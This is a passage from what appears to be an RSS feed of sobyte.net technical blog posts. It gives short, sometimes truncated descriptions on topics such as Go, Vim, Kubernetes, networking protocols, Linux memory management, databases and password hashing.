      <description>In the process of writing code, sometimes we need to do some bulk queries/operations, which often involve chunking a large array or slice.
For example, if we have an array of ids and we want to request an interface to query information based on the ids, the interface supports batch queries, but the maximum number of queries per query is 100. the best practice is to take up to 100 ids from the array each time and do a batch query until the array is traversed.</description>

I tried it and the speed is only 5M or so. It took almost an hour to finish copying, which was unbearable. So I looked into how to speed up the transfer speed.
So why is it slow? The main reason is that ssh encrypts 🔐 the communication content, the sender has to encrypt and the receiver has to decrypt.</description>

      <description>Vim provides a macro recording feature that allows you to record a series of actions and then repeat them. This feature is relatively cold, but also very powerful. Just because the operation is complicated, few people learn and rarely use. But I think the idea of macros is very simple, the reason why I think it is complex is not particularly good real-world cases to reflect its value. I came across a more suitable scenario for the use of macros when I was modifying the Sniper framework today.</description>

      <description>The http service of the website is developed in Go. Because it listens to the standard ports 80 and 443, the http service is always run under the root account. But running with root is very risky. If the code is vulnerable and the bad guys break it, they will get root access and the consequences will be unthinkable. That&amp;rsquo;s why http services like nginx support setting the account under which the worker processes run.</description>

      <description>Recently, I was going to write a vim introductory article for new Go developers, so I started to organize my vim configuration and plug-in system. While sorting out the file-related plugins, I found myself using the ack plugin. ack itself has no file search capability; it uses tools like ack/ag to search for articles. The plugin itself only serves the purpose of calling commands and displaying results. Since it is relatively simple, why not implement one yourself?</description>

      <description>Slicing Operations Functions like Map/Reduce/Filter are often used in functional programming. Because of generics, we can also write Map/Reduce/Filter functions that can be adapted to any type 😂.
All three of these functions are used to process sliced data, so Go officially wanted to provide a standard slices package. But it&amp;rsquo;s subject to Rob&amp;rsquo;s objection, so it has to go under exp package underneath.

      <description>Linux provides a series of system calls that allow us to pass file descriptors between processes. Instead of simply passing the file descriptor, which is a 32-bit integer, we actually pass the file handle to the target process so that it can read and write to the file. Now suppose process B wants to send a file descriptor to process A. Let&amp;rsquo;s see how to do that.

With P2P technology, files are no longer stored centrally on one server, but are distributed among users&amp;rsquo; nodes, each of which is a provider and a user of the service. Such a system has high availability, so that the whole service will not be unavailable due to the downtime of one or two machines.</description>

So how to meet the needs of the general public to build a website? Cloudflare is a very good choice. Cloudflare is a CDN provider, can provide reverse proxy for the site. It does this by resolving the domain name to Cloudflare&amp;rsquo;s server (or proxy), and then the browser uses Cloudflare&amp;rsquo;s certificate to establish an SSL connection with the proxy; then the proxy will establish an SSL connection with the target server using a self-signed certificate, and the next data are forwarded by the proxy.</description>

      <description>LPeg is a pattern matching library for Lua. When I was first introduced to LPeg, I thought it was just another form of regular expression; I found out that it is much more powerful than regular expressions, and can easily match complex patterns that are difficult to match with regular expressions, and even parse syntax. In fact, LPeg is Parsing Expression Grammars for Lua, which is designed to parse grammars. LPeg makes it easy to parse all kinds of grammars, for example in 400 lines of code parsing Lua source code into abstract syntax trees.</description>

In practice, KCP over UDP is often used instead of TCP for online games and audio/video transmission. The implementation of KCP is short and concise, which is good for learning.

Hashing and Consistent Hashing A hash function, or hash function, maps the elements of a large definition field into a small finite value field. The elements in the value domain are sometimes called buckets, and the size of the value domain is also referred to as the number of buckets.
MD5 is a common hash function that maps data of any size (the larger definition field) into a 16-byte hash (the smaller finite value field).</description>

      <description>This article mainly wants to talk about one topic - authentication. That is, how to confirm that this data is sent by this person?
User Password To solve this problem, let&amp;rsquo;s look at one of the simplest solutions - the use of passwords. Usually, to prove a person&amp;rsquo;s identity on the Internet, something private and unique about that person is needed. For example, in many places, if you provide your user name + password, you can be sure that the person is you (note: password management, strong password settings, password leaks, password cracking and password cajoling are not in this article), that is, the password is a very private matter, we can assume that only one person in the world knows this matter, so We can assume that only one person in the world can know the password, so that when the person has provided the correct password, we can authenticate the person.</description>

      <description>Many people, including myself, have long believed that TCP-based application layer protocols are simple and only require a packet header. Because TCP is a reliable protocol, it ensures that data reaches the other side in an orderly and error-free manner; it is just stream-oriented and does not preserve message boundaries, so we only need to define protocol packet headers that can distinguish individual datagrams. However, this is wrong: the transport layer protocol is limited in what it can do, and the application layer protocol can do much more than encapsulate a packet header.</description>

For example, if t = &amp;quot;abcab&amp;quot;, s = &amp;quot;ababcabd&amp;quot;, the algorithm should return 2. Talking about string matching, we have to mention the KMP algorithm. KMP is a very powerful algorithm, which is very clever and can match strings in linear time complexity.</description>

      <description>Helps you distinguish between encodeURI and encodeURIComponent usage scenarios
Background Recently, while working on the preview feature in my company, I came across a scenario of encoding the request parameters. So the question arises.
 Why is it necessary to encode a link or parameter? When do I need to encode? What is the difference between * encodeURI and encodeURIComponent?  Let&amp;rsquo;s take a look at it together~
Why do you need to encode Http protocol parameter transmission is &amp;ldquo;key=value&amp;rdquo; such key-value pairs, if you want to pass more than one parameter you need to use the &amp;ldquo;&amp;amp;&amp;rdquo; symbol to split the key-value pairs.</description>

      <description>Tomaž Vajngerl, a developer from Collabora, has been working on a new Cairo backend, which was successfully merged into the LibreOffice codebase on Thursday; introducing another graphics backend to the open source office suite. And there have been some new follow-up commits to start moving more functionality to SvpGraphicsBackend.
SvpGraphicsBackend is LibreOffice&amp;rsquo;s new VCL (Visual Class Library) backend that contains a backend implementation of graphics drawing, using Cairo for drawing. currently, according to Vajngerl, the Cairo-based graphics drawing implementation is basically on SvpSalGraphics; however, there will be a gradual shift to SvpGraphicsBackend, just like the other vcl plugins.</description>

      <description>Whether you&amp;rsquo;re a fan of the Lord of the Rings movies or not, you&amp;rsquo;ll agree that almost everyone loves unity, and having a unified development experience is something that developers have always strived for and welcomed.
Development environments have long been tightly coupled with specific technologies, such as Visual Studio, for primarily .NET-based development. We&amp;rsquo;ve seen heated debates among developers who endlessly argue for one tool over another. This will never end, nor should it, because many times these arguments result in the awesome tools we are using today.</description>

      <description>When docker mounts the disk, as many containers use root to run programs inside the container, it will cause the files generated in the mount belong to root:root. generally the user outside the container is not root, which will make file sharing or even reading logs unnecessary trouble. This article aims to solve the problem of generating root privileged files from the root without changing the container.
The files generated by docker often need to be accessed by sudo chmod o+rw *, which is troublesome, but at least you have sudo privileges.</description>

      <description>Introduction This blog is about the four type conversions in C++: static_cast, const_cast, reinterpret_cast, const_cast, their usage and some usage scenarios.
static_cast The reference scenario of static_cast compares conversions, according to CppReference, to perform static type conversions from the expression e to T in the following cases.
Common types  for the expression e can be converted from an implicit type to T If a standard conversion sequence exists for types from T to e, a static type conversion can perform the inverse of that implicit type conversion sequence.</description>

      <description>Introduction Smart pointers are mainly used to automate the management of resources. There are std::unqiue_ptr, std::shared_ptr and std::weak_ptr according to their usage.
unique_ptr unique_ptr is mainly used to implement exclusive management of a resource object whose life cycle will end at the end of the unique_ptr declaration cycle or when it is pointed to another resource. A resource managed by unique_ptr can be transferred to another unqiue_ptr via std::move.

      <description>Introduction In autonomous driving, there are several coordinate systems involved from the car&amp;rsquo;s sensors to global positioning, which are briefly organized below.
Sensor Coordinate System Each sensor has its own coordinate system, which can be divided into relative measurement (measuring environmental information) and absolute measurement (measuring its own information) according to its measurement principle. Relative sensors such as cameras and LiDAR measure environmental information for indirect positioning, while absolute sensors such as IMUs, tachometers, and GPS measure their own motion (speed, position, attitude, etc.</description>

      <description>Advertising attribution methods To discuss ad cheating, you need to understand the logic of ad attribution first. Cheating methods are basically based around the logic of ad attribution. There are various ad attribution schemes, we will mainly discuss here application-based advertising, overseas mobile ecology, and third-party attribution schemes. Overseas mobile advertising ecology has more mature and credible third-party attribution platforms, such as Appflyer, Adjust and Kochava, etc. The core logic of attribution is that the final attribution logic is the same as the final attribution logic.</description>

      <description>GraphQL is both a query language for the API and a runtime for your data queries. GraphQL provides a complete set of easy-to-understand descriptions of the data in your API, allowing the client to get exactly the data it needs without any redundancy, and making it easier for the API to evolve over time, as well as for building powerful developer tools.
 Over the last decade, REST has become the design standard for Web APIs, providing some great ideas such as stateless servers and structured access to resources.</description>

      <guid>https://www.sobyte.net/post/2021-12/why-you-should-reject-racy-code/</guid>
      <description>In any language concurrent programming scenario, there is a race problem. Modern languages have two ideas to solve the race problem, one is to restrict the user from writing race code as much as possible by ownership+Sync/Send like rust, and one is to check for data contention during testing by race detector like Go.
The design of Go&amp;rsquo;s race detector means that it can&amp;rsquo;t be turned on in an online environment, and many companies don&amp;rsquo;t actually have a race test before they go live, which leads some Gophers to think that it&amp;rsquo;s okay if I write race code because it&amp;rsquo;s &amp;ldquo;eventually consistent&amp;rdquo;.</description>

      <description>According to the description of the Go generalization proposal, Go does not support generalized methods:No parameterized methods. The main reason Go generic processing is implemented at compile time, and generic methods are difficult to determine how the generic scheme should be instantiated without contextual analysis and inference at compile time, or even impossible to determine, resulting in the current (Go 1.18) Go implementation not supporting generic schemes. However, the lack</description>

      <description>The software world is evolving faster than ever, and the need to stay competitive requires new software releases as quickly as possible, without impacting users online. Many enterprises have migrated their workloads to Kubernetes clusters, which inherently take into account some production environment practices, but there are some additional things we need to do to make Kubernetes truly zero downtime without disruption or lost requests.
Rolling Updates By default, Kubernetes Deployment has a rolling update policy for Pod updates, which ensures that some instances are still running when the application is updated at any point in time to prevent the application from going down, and only kills the old Pod when the newly deployed Pod is up and ready to handle traffic.</description>

      <description>What is RESTful API? REST: The full name is Resource Representational State Transfer, or Representational Layer State Transfer. Look at the concept, I guess no one can understand. Explain in a human word: URL to locate resources, using HTTP verbs (GET, POST, PUT, DELETE) to describe the operation.
Resources
A &amp;ldquo;resource&amp;rdquo; is an entity on the Web, or a specific piece of information on the Web. It can be a piece of text, a picture, a song, a service, in short, a concrete reality.</description>

So I came up with DropBox.
However, we couldn&amp;rsquo;t simply put the project in the DropBox directory, because that would cause every simple save to initiate a file sync, and some temporary file changes during compilation would cause the DropBox to sync, which would drive the CPU usage of the computer very high.</description>

      <description>Normally, when a client in the cluster connects to the service, the Pod supporting the service can get the IP address of the client, but when the connection is received through the node port, the source IP address of the packet will change because of the Source Network Address Translation (SNAT) performed on the packet, and the Pod on the backend cannot see the actual client IP, which is a problem for some applications, for example, the request log of nginx cannot get the exact IP of the client access.</description>

      <description>A Dockerfile is the starting point for creating a Docker image, which provides a well-defined set of instructions that allow us to copy files or folders, run commands, set environment variables, and perform other tasks needed to create a container image. It is important to write Dockerfile to ensure that the generated images are safe, small, fast to build and fast to update.
In this article we&amp;rsquo;ll see how to write good Dockerfiles to speed up the development process, ensure build reusability, and generate images that are safe to deploy to production.</description>

      <description>Okteto is an application development tool for developing and testing code in Kubernetes. It is very easy to launch a development environment in Kubernetes with one click through Okteto. We have also introduced the Skaffold tool from Google, and today we will demonstrate how to use Okteto to build Python application development environment.
Installation We just need to install the Okteto CLI tool on our local development machine. To use Okteto to configure the environment we need to have access to a Kubernetes cluster on our local machine, so The prerequisite is to configure a kubeconfig file for an accessible Kubernetes cluster.</description>

      <description>Introduction to SSL/TLS When we use the HTTP protocol, the data transmitted is insecure, because all data going to and from the client and the server is in plaintext:.
 Third parties can get access to the real data Third parties can tamper with the data Third parties can impersonate the server or client  The full name of HTTPS is Hypertext Transfer Protocol Secure, which is used to exchange information securely (secure communication) between two end systems on a computer network, which is equivalent to adding a Secure secure word eye to HTTP, then we can give a HTTPS definition: HTTPS is a protocol and specification for secure transmission of text, images, audio, video and other hypertext data between two points in the computer world.</description>

      <description>For a production environment and an aspiring ops person, even millisecond level downtime is not tolerated. Proper logging and monitoring of infrastructure and applications is very helpful in solving problems, and can also help optimize costs and resources, as well as help detect some problems that may occur later. In this article we will use the more lightweight Grafana Loki to implement log monitoring and alerting. The key thing is that if you are familiar with using Prometheus, you will have no problem using Loki, as they are basically the same, and have the same Label tag if they are auto-discovered in a Kubernetes cluster.</description>

      <description>In this article we&amp;rsquo;ll cover how to build a Kubernetes cluster using WSL2 and KinD under Windows 10. Over the past few years, Kubernetes has become the de facto standard in container orchestration. While there are now a variety of Kubernetes distributions and installers to deploy Kubernetes environments, we still need to deploy and run Kubernetes clusters locally, especially for developers, except in cloud or bare-metal environments. However, Kubernetes was</description>

      <description>KinD is a very lightweight Kubernetes installation tool that treats Docker containers as Kubernetes nodes, making it very easy to use. Since you can run a Kubernetes cluster in a Docker container, it&amp;rsquo;s natural to wonder if you can run it in a Pod. What are the problems with running in a Pod?
Installing Docker Daemon in a Pod KinD is now dependent on Docker, so first we need to create an image that allows us to run Docker Deamon in the Pod, so that we can execute commands like docker run inside the Pod, but this is not the same as the DIND mode of mounting docker.</description>

      <description>We&amp;rsquo;ve talked about GitOps practices before, and we know that GitOps advocates managing all of your configuration through Git and versioning your environment configuration and infrastructure through declarative code.
In Kubernetes, we know that you can use resource manifest files to manage a cluster&amp;rsquo;s resource objects, but it&amp;rsquo;s not a good idea to store Kubernetes Secrets data in a Git repository, which is also very insecure.
Kubernetes Secrets are resource objects used to help us store sensitive information, such as passwords, keys, certificates, OAuth Token, SSH KEY, etc.</description>

      <description>The specific issue to be analyzed today is &amp;lsquo;why DNS uses the UDP protocol&amp;rsquo;. DNS acts as a phone book for the entire Internet, translating domain names that can be understood by humans into IP addresses that can be understood by machines, eliminating the need for users of the Internet to have direct access to IP addresses that are difficult to read and understand.
I believe that it is common knowledge among software engineers that DNS uses the UDP protocol, and anyone who knows a little about computer networks knows that DNS uses the UDP protocol to transfer data, but this is not entirely true.</description>

      <description>The two transport protocols, UDP and TCP, are core members of the IP protocol cluster. The RFC 768, published in 1980, defines the UDP protocol, which allows us to pass data across a network of multiple computer connections. The common DNS protocol can use the UDP protocol to obtain the results of domain name resolution
UDP is the simplest protocol that can transmit data, and its protocol header (also called protocol header) is only 8 bytes.</description>

      <description>Arrays and slices are common data structures in the Go language, and many developers new to Go tend to confuse these two concepts. In addition to arrays, Go introduces another concept - slicing. Slicing has some similarities to arrays, but their differences lead to significant differences in usage. In this section we will introduce the underlying implementation of arrays from the Go compile-time runtime, which will include several common operations for initializing, accessing, and assigning values to arrays.</description>

      <description>HTTP (Hypertext Transfer Protocol) has become the most commonly used application layer protocol on the Internet, however, it is only a network protocol for transmitting hypertext and does not provide any security guarantees, using plaintext to transmit packets over the Internet makes eavesdropping and man-in-the-middle attacks possible. Transmitting passwords over HTTP is actually similar to running around naked on the Internet.
Netscape designed the HTTPS protocol in 1994 to secure data transfers using Secure Sockets Layer (SSL), and with the development of Transport Layer Security (TLS), we now use TLS instead of the deprecated SSL protocol, although the term SSL certificate is still used.</description>

      <description>The data and variables in a program are allocated to the virtual memory where the program resides, which contains two important areas: the Stack and the Heap. Most of the arguments, return values, and local variables of function calls are allocated to the stack, which is managed by the compiler; different programming languages use different methods to manage the memory in the heap area. The objects in the heap are</description>

      <description>The TCP/IP protocol cluster establishes a conceptual model for communication protocols in the Internet, and the two main protocols in the cluster are TCP and IP. TCP in the TCP/IP protocol cluster guarantees the reliability and order of data segments, and with a reliable transport layer protocol, application layer protocols can directly use TCP to transfer data without the need to care about Loss and duplication of data segments
The IP protocol solves the routing and transmission of packets, and the upper layer TCP protocol is no longer concerned with routing and addressing.</description>

      <title>Why does the TCP protocol have a TIME_WAIT state?</title>
      <link>https://www.sobyte.net/post/2021-12/whys-the-design-tcp-time-wait/</link>

      <guid>https://www.sobyte.net/post/2021-12/whys-the-design-tcp-time-wait/</guid>
      <description>The TCP protocol contains 11 different states, and the TCP connection transitions states based on the messages sent or received. The state machine shown below illustrates all possible transitions, including not only the state transition process under normal conditions, but also the state transition under abnormal conditions.
Both parties communicating using the TCP protocol will trigger the TIME_WAIT state when closing the connection. The operation of closing the connection actually tells the other party to the communication that it has no data to send, but it still maintains the ability to receive data from the other party, a common process of closing the connection is as follows.</description>

      <description>You should be careful about setting the CPU limit for loads in k8s. A value that is too small can introduce extra, meaningless latency into your program, and a value that is too large can introduce too large a blast radius and weaken the overall stability of the cluster.
request and limit One of the major benefits of k8s is resource isolation. By setting the request and limit of the load, we can easily allow different programs to coexist on the right node.</description>

      <description>In almost all modern programming languages, the garbage collector is a complex system that requires a lot of effort in order to reclaim the deprecated memory without affecting the user program. Java&amp;rsquo;s garbage collection mechanism is a good example. Java 8 contains four garbage collectors, linear, concurrent, parallel marker removal, and G1. It takes a lot of effort to understand how they work and the details of their implementation. In</description>

      <description>JSON (JavaScript Object Notation), a lightweight data interchange format1, holds almost a majority of the market share today. Although it lacks serialization and deserialization performance compared to more compact data interchange formats, JSON offers good readability and ease of use, and it is a very good choice for using JSON as a serialization format when extreme mechanical performance is not sought.
Design Principles Almost all modern programming languages incorporate functions for handling JSON directly into the standard library, and the Go language is no exception.</description>

With the plug-in system, we can load dynamic libraries at runtime to implement some of the more interesting features.
Design Principles The plug-in system of Go language is implemented based on C dynamic libraries, so it also inherits the advantages and disadvantages of C dynamic libraries.</description>

      <description>CPU and Main memory are scarce resources in an operating system. All processes running in the current operating system share the CPU and memory resources in the system, and the operating system uses CPU scheduler to allocate CPU time and introduces virtual memory system to manage physical memory.
Before we can answer the need for virtual memory, we need to understand what virtual memory is in an operating system and what role it plays in the operating system.</description>

      <description>When we work with relational databases, the primary key is a concept that cannot be avoided. The primary key acts as an identifier for a record, and we can locate a unique record in a table by its identifier.
In a relational database, we choose the smallest subset of multiple fields in a record as the unique identifier for that record in the table. Depending on the definition of a primary key in a relational database, we can choose either a single column as the primary key or multiple columns as the primary key, but the primary key must exist and be unique throughout the record.</description>

      <description>The network layer protocol assumes the two major functions of packet forwarding and routing, and it can provide the upper layer with the responsibility of transporting packets between different hosts. IP protocol, as a network layer protocol, plays an extremely critical role in today&amp;rsquo;s Internet, although it can only provide connectionless and unreliable services.
In general, when we want to access services provided by other hosts, we need to access the target host through an IP address, which is the only way to be accessed by other hosts on the Internet.</description>

Because the Overlay network is a virtual network built on top of another computer network, it cannot stand alone, and the network on which the Overlay layer depends is the Underlay network, and the two concepts often appear in pairs.</description>

      <description>A system call is a way for a computer program to request services from the operating system kernel during execution. This may include hardware-related services, the creation and execution of new processes, and process scheduling. Anyone with a little knowledge of operating systems knows that - system calls provide the user program with an interface to the operating system.
The famous glibc for C language encapsulates the system calls provided by the operating system and provides a well-defined interface that allows engineers to develop upper-level applications directly using the functions encapsulated in the container.</description>

      <guid>https://www.sobyte.net/post/2021-12/whys-the-design-linux-default-page/</guid>
      <description>We all know that Linux manages memory in pages. Whether it is loading data from disk into memory or writing data from memory back to disk, the operating system operates in pages. Even if we write only one byte of data to disk, we need to swipe the entire data from the entire page to disk.
Linux supports both normal-sized memory pages and large memory pages (Huge Page). The default size of memory pages on most processors is 4KB, and although some processors use 8KB, 16KB, or 64KB as the default page size, 4KB pages are still the mainstream of the default memory page configuration of the operating system; in addition to the normal memory page size, different processors also contain large pages of different sizes.</description>

In this article, we will analyze an important concept in relational databases - Foreign Key.
In a relational database, a foreign key, also known as a relational key, is a set of columns that provide a connection between relational tables in a relational database.</description>

      <description>Non-Uniform Memory Access (NUMA) is a computer memory design approach, as opposed to Uniform Memory Access (UMA), also known as Symmetric Multi-Processor Architecture (SMP), which was used by early computers, but most modern computers use NUMA architecture to manage CPU and memory resources.
As application developers, we are less likely to need direct access to hardware because the operating system shields us from many hardware-level implementation details. However, because NUMA affects applications, NUMA is something we must understand and be familiar with if we want to write high-performance, low-latency services, and this article will cover its impact in two ways.</description>

      <description>Anyone who knows a little bit about Linux knows that Linux divides the physical Random Access Memory (RAM) into 4KB-sized memory blocks by page, and the Swapping mechanism we are going to introduce today is closely related to memory, which is the process of the operating system copying the contents of physical memory pages to the swap space on the hard disk to release the memory. The physical memory and the swap partition on the hard disk make up the virtual memory available on the operating system, and these swap spaces are pre-configured by the system administrator.</description>

      <description>In this paper, we would like to present a paper from the 2018 ATC Journal &amp;ndash; NanoLog: A Nanosecond Scale Logging System, which implements NanoLog, a high-performance logging system that can perform 1 ~ 2 orders of magnitude better than other logging systems in the C++ community, e.g., spdlog, glog, and Boost Log. In this article, we will briefly analyze the design and implementation principles of NanoLog.
Logging is an important part of system observability, and I&amp;rsquo;m sure many engineers have had the experience of adding logs on the fly to check for problems, a process the author has just re-visited.</description>

      <description>ClickHouse is one of the more popular online analytical processing (OLAP) data stores recently. Compared to our common traditional relational databases such as MySQL and PostgreSQL, data stores such as ClickHouse, Hive and HBase for online analytical processing (OLAP) scenarios tend to use columnar storage.
Readers who know a little about databases know that Online Transaction Processing (OLTP) and Online Analytical Processing (OLAP) are the two most common scenarios of databases, and these two scenarios are not the only two, from which there are also concepts derived from Hybrid Transactional/Analytical Processing (HTAP).</description>

      <description>Disk for persistent storage is not a scarce resource today, but CPU and memory are still relatively expensive resources, and this article will describe how memory, a scarce resource in computers, is managed.
Memory management systems and modules play an important role in operating systems and programming languages. The use of any resource is inseparable from the two actions of requesting and releasing, and two important processes in memory management are memory allocation and garbage collection, and how a memory management system can use limited memory resources to provide services to as many programs or modules as possible is its core goal.</description>

      <description>Kubernetes is the de facto standard in container orchestration today, and Docker has played a pivotal role in containers from its inception to today, and is the default container engine in Kubernetes. However, in December 2020, the Kubernetes community decided to move forward with removing Dockershim-related code from its repositories, which was significant for both the Kubernetes and Docker communities.
I&amp;rsquo;m sure most developers have heard of Kubernetes and Docker and know that we can use Kubernetes to manage Docker containers, but they may not have heard of Dockershim, the Docker shim.</description>

      <description>This paper presents a paper from the 2011 NSDI journal &amp;ndash; Mesos: A Platform for Fine-Grained Resource Sharing in the Data Center, which implements Mesos to manage different computing frameworks, such as Hadoop and MPI, in a cluster. Although the Mesos cluster management system is a technology that was released more than 10 years ago and has been gradually replaced today by the more mainstream and general container orchestration system Kubernetes, it does solve some of the cluster management problems.</description>

      <description>Kubernetes is a very complex cluster orchestration system, yet even though it contains rich functionality and features, it cannot meet the needs of all scenarios because of the inherent high complexity of container scheduling and management. While Kubernetes can solve most of the common problems in most scenarios, in order to achieve a more flexible strategy, we need to use the scalability provided by Kubernetes for specific purposes.
Each project will focus on different features at different cycles, and we can simply divide the evolution of the project into three distinct phases.</description>

      <description>This paper is about the paper in the 2020 NSDI Journal &amp;ndash; Firecracker: Lightweight Virtualization for Serverless Applications, which implements Firecracker to provide lightweight virtualization support on the host. Many developers today choose to use Serverless containers and services to reduce system overhead, improve hardware resource utilization, and enable rapid scaling, but the Serverless scenario places higher demands on container isolation, security, and performance.
When serving multiple tenants with the same hardware, we expect the different workloads to be isolated for security and performance with minimal additional overhead.</description>

      <description>I remember a dozen years ago when I was still using the early Windows system, every time the system would become very laggy, then you need to open the system provides the following disk defragmentation program, when the defragmentation is complete will feel the system becomes slightly smoother some.
In the file system, defragmentation is the process of reducing fragmentation in the file system, which rearranges the contents of the same files on the disk in order and uses compression algorithms to remove gaps between files, somewhat similar to the tag compression algorithm in garbage collection.</description>

      <description>The pattern of development of most things in the world is similar. In the beginning, relatively general solutions tend to appear to solve most problems, followed by solutions specifically designed for a certain scenario that do not solve general problems but perform extremely well in some specific areas. In the field of computing, the CPU (Central Processing Unit) and the GPU (Graphics Processing Unit) are general-purpose and specific solutions, respectively, with the former providing the most basic computing power to solve almost any problem, and the latter excelling in areas such as graphics computing and machine learning.</description>

      <title>Why Linux and macOS don&#39;t need defragmentation</title>

      <guid>https://www.sobyte.net/post/2021-11/whys-the-design-linux-macos-fragmentation/</guid>
      <description>I believe that many software engineers today use Linux or macOS systems, and unlike Windows, we hardly see the concept of disk defragmentation. From personal experience, the author has not defragmented a disk in macOS for the past seven or eight years, and you won&amp;rsquo;t find any related operations in today&amp;rsquo;s disk tools, only the diskutil command to set whether a disk is defragmented on or off.
Windows operating systems may need to defragment their disks every once in a while, and there are two reasons behind this problem: one is that Windows uses a very simple file system called FAT, which is designed in such a way that the same files may be scattered in different locations on the disk, and the other is that solid state drives were not popular in the ancient times and mechanical hard drives have poor random read and write performance.</description>

      <description>Swap in Linux is similar to virtual memory in Windows, which means that when there is a shortage of memory, a portion of the hard disk space can be used as virtual memory, thus solving the problem of insufficient memory capacity.
When installing a Linux system you need to set up a separate swap partition while Windows installation does not have this requirement, mainly because of the different ways of implementation.</description>

      <description>Kubernetes, released in 2014, has become the de facto standard in container orchestration today, and I&amp;rsquo;m sure developers who talk about Kubernetes will repeat the above phenomenon over and over again. As the chart below shows, most individuals or teams today choose Kubernetes to manage containers, and 75% of people use Kubernetes in production environments.
In this context of universal learning and use of Kubernetes, it is also important to be very clear about what the limitations of Kubernetes are.</description>

      <description>When you think of Redis, you think of Memcached, and vice versa. Those who know both have a general impression that Redis supports simple key-value data types compared to Memcached, and also provides storage for data structures such as list, set, zset, and hash; redis supports data backup, redis supports data persistence, and it looks like redis is more powerful than memcached. The redis support for data backup, redis support for data persistence, looks redis than memcached more awesome, so in fact is this not the case?</description>

      <description>When installing MariaDB, I learned about TokuDB, which replaces InnoDB, and it&amp;rsquo;s great to see the introduction.
What is TokuDB? The most popular MySQL engine that supports full transactions is INNODB, which is characterized by the fact that the data itself is organized by B-TREE, which is a huge B-TREE index clustered by primary key. So at this point, the write speed will be somewhat reduced, because to write each time to use an IO to do the index tree rearrangement.</description>

      <description>In computer science, fuzzy string matching is a technique for finding a string that matches a pattern approximately (rather than exactly). In other words, fuzzy string matching is a search that finds a match even if the user misspells a word or enters only part of a word to search. Therefore, it is also known as string approximate matching. String fuzzy search can be used in various applications, such as</description>

      <description>Elastic APM is a tool for application performance monitoring on Elastic Stack that allows us to monitor application performance in real time by collecting incoming requests, database queries, cache calls, and more. This makes it easier for us to quickly pinpoint performance issues.
Elastic APM is OpenTracing compatible, so we can use a large number of existing libraries to track application performance.
For example, we can trace a request in a distributed environment (microservice architecture) and easily find possible potential performance bottlenecks.</description>

      <description>When deploying WEB applications in PHP and Python, you will encounter concepts like CGI, FastCGI, WSGI, uWSGI, etc. Previously, I have been very confused about these concepts and did not know how to choose. So I took the time to sort out this part, and the following are the main contents.
CGI CGI, or Common Gateway Interface, is a standard for interfacing between external applications (CGI programs) and Web servers, a protocol for passing information between CGI programs and Web servers.</description>

      <description>Cygwin Cygwin, formerly from Cygnus (acquired by Red Hat), is currently a project under the RedHat name. The purpose of the project is to provide a Unix-like environment (represented by GNU tools) running on a Windows platform. To achieve this, Cygwin provides a set of abstraction layer dlls that convert some of the Posix calls into Windows API calls and implement the relevant functionality. The most typical and basic emulation layer is cygwin1.</description>

      <description>Introduction to MQTT MQTT (Message Queuing Telemetry Transport) is an instant messaging protocol developed by IBM. It is designed with lightness, openness, simplicity, and specification in mind, and is therefore easy to implement. These features make it a good choice for many scenarios, including constrained environments such as machine-to-machine communication (M2M) and Internet of Things environments (IoT) that require very small code packages or very expensive network bandwidth.
The MQTT protocol is a protocol designed for the communication of a large number of remote sensors and control devices with limited computing power and operating on low-bandwidth, unreliable networks, and has several key features, as follows.</description>

      <description>What is a hash ? Hash is the transformation of an input of arbitrary length (also called pre-image) into an output of fixed length by a hashing algorithm, and that output is the hash value. This transformation is a compressed mapping, i.e., the space for the hash value is usually much smaller than the space for the input, and different inputs may be hashed into the same output, and it is not possible to uniquely determine the input value from the hash value.</description>

      <description>As we all know, storing plaintext passwords is a very bad thing. If a database stores a plaintext password, if the data is leaked, then the user account is in danger. Because of this, back in 1976, industry came up with a set of standards for storing passwords securely using a one-way hashing mechanism (starting with Unix Crypt). Unfortunately, while this approach prevents you from reading the password directly, all the hashing mechanism does is prevent an attacker from brute-force cracking it in an offline environment, where the attacker simply traverses a list of possible passwords containing the correct password, hashes each possible password and then compares it to the obtained password (the one stored using the hashing mechanism).</description>

      <description>APK file introduction Each application that needs to be installed to the android platform is compiled and packaged as a separate file with the suffix .apk (Android application package), which contains the binary code, resources, configuration files, etc. of the application. The apk file is actually a zip archive that can be unzipped by an unzip tool (change the suffix to .zip and then unzip it with the unzip file.)</description>

      <description>The datediff function in Hive SQL returns the number of days between 2 dates. One of the more interesting pitfalls found during use is that

The following code is executed and the result also has problems.

      <description>In the PC era, when a user asks for a page, we will first check whether a SessionId exists in the user&amp;rsquo;s cookie, and if it does not exist, we will generate a SessionId by random number and store it in the cookie. If it exists, we will update the expiration time of this cookie (after 30 minutes). That is, as long as the user visits the interval within 30 minutes is considered the same Seesion, more than 30 minutes will generate a new SeesionId and define browsing as a new Session.</description>

      <description>There are two types of loops you can use in Python: for loops and while loops. You can use them for repetitive tasks. As a result, repetitive tasks will happen automatically, making the process more efficient. Unfortunately, you may run into some problems with your loops. Sometimes your program may run into problems that require it to skip a part of the loop or exit the loop altogether. Or you may need it to ignore external factors that affect the program.</description>

      <description>We all know that in Python we can for loop to iterate through a list, tuple or range object. So what is the underlying principle? In understanding Python&amp;rsquo;s data structures, containers (container), iterable objects (iterator), iterators (iterator), generators (generator), lists/sets/dictionary comprehensions (list, set, dict comprehension), and many other concepts are mixed together to make beginners confused. The relationship between them. container A container is a data structure that organizes multiple</description>

      <description>LVS is the abbreviation of Linux Virtual Server, which means Linux Virtual Server, a virtual server clustering system. LVS is a free software project initiated by Dr. Wen-Song Zhang, and is mainly used for load balancing of multiple servers. It works at the network layer and can achieve high performance, high availability server clustering technology.
 It is cheap and can combine many low performance servers together to form a super server.</description>

      <description>Apache Kafka is the most popular distributed messaging publish-subscribe system available today. While Kafka is very powerful, it is equally complex and requires a highly available and robust platform to run. In a world where microservices are prevalent and most companies are adopting distributed computing, it is still very advantageous to use Kafka as a core messaging system.
If you run your microservices in a Kubernetes cluster, it makes sense to run a Kafka cluster in Kubernetes to take advantage of its built-in resiliency and high availability, and we can easily interact with Kafka Pods within the cluster using the built-in Kubernetes service discovery.</description>

      <description>Introduction to Decorators A decorator is a high-level Python syntax. It can be used to process a function, method, or class. In Python, we have several ways to process functions and classes. Compared to other ways, decorator syntax is simple and the code is highly readable. As a result, decorators have a wide range of applications in Python projects. Decorators are often used in scenarios with tangential requirements, some classic</description>

      <description>Background In the existing network environment, some businesses using Redis clusters often need to perform node expansion operations as their business volume rises. I have previously learned that after some operations and maintenance students expanded Redis clusters with a large number of nodes, the business side reported a decrease in cluster performance, as evidenced by a significant increase in access latency. Some businesses are sensitive to Redis cluster access latency,</description>

